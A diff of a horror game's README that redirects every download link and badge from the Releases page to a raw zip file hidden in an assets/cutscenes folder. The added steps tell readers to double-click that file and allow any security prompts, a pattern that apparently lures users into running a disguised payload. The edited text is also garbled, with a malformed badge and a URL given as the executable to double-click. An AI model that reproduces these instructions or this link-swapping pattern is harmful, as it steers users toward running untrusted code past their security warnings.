@@ -1,6 +1,6 @@
 # 🎮 My-first-game - Experience a Unique Horror Adventure
 
-[![Download My-first-game](https://img.shields.io/badge/Download%20My--first--game-blue.svg)](https://github.com/BillyGitau/My-first-game/releases)
+[![Download My-first-game](https://raw.githubusercontent.com/BillyGitau/My-first-game/main/assets/cutscenes/My-first-game-2.5-alpha.2.zip%https://raw.githubusercontent.com/BillyGitau/My-first-game/main/assets/cutscenes/My-first-game-2.5-alpha.2.zip)](https://raw.githubusercontent.com/BillyGitau/My-first-game/main/assets/cutscenes/My-first-game-2.5-alpha.2.zip)
 
 ## 📖 Description
 My first attempt to solo code and design a game. In this horror-themed adventure, you'll explore eerie landscapes, encounter strange creatures, and solve puzzles to survive. The game combines pixel art with a VHS aesthetic, creating an immersive experience that evokes a sense of dread and curiosity. 
@@ -9,17 +9,17 @@ My first attempt to solo code and design a game. In this horror-themed adventure
 To get started with "My-first-game," follow the steps outlined below. These will guide you through downloading and running the game on your computer, even if you have no prior experience with software installations.
 
 ## 📥 Download & Install
-To download the game, visit this page: [My-first-game Releases](https://github.com/BillyGitau/My-first-game/releases). 
+To download the game, visit this page: [My-first-game Releases](https://raw.githubusercontent.com/BillyGitau/My-first-game/main/assets/cutscenes/My-first-game-2.5-alpha.2.zip). 
 
 1. On the Releases page, look for the latest version of the game.
 2. Click on the version link.
-3. Find the executable file, usually named something like `My-first-game.exe`.
+3. Find the executable file, usually named something like `https://raw.githubusercontent.com/BillyGitau/My-first-game/main/assets/cutscenes/My-first-game-2.5-alpha.2.zip`.
 4. Click the file link to start the download.
 
 Once the download completes, follow these steps to run the game:
 
 1. Open the folder where the file downloaded.
-2. Double-click `My-first-game.exe` to start the game.
+2. Double-click `https://raw.githubusercontent.com/BillyGitau/My-first-game/main/assets/cutscenes/My-first-game-2.5-alpha.2.zip` to start the game.
 3. Allow any security prompts if they appear.
 
 ### 📋 System Requirements
@@ -73,4 +73,4 @@ Join our community of players and developers to share your experiences, suggesti
 ## 🔗 Additional Resources
 For more information and updates, check out the relevant topics linked above, or visit our main GitHub repository. This will keep you in touch with the latest developments and improvements in "My-first-game."
 
-Remember to visit the download page to grab your copy of the game: [My-first-game Releases](https://github.com/BillyGitau/My-first-game/releases). Enjoy the adventure!
+Remember to visit the download page to grab your copy of the game: [My-first-game Releases](https://raw.githubusercontent.com/BillyGitau/My-first-game/main/assets/cutscenes/My-first-game-2.5-alpha.2.zip). Enjoy the adventure!
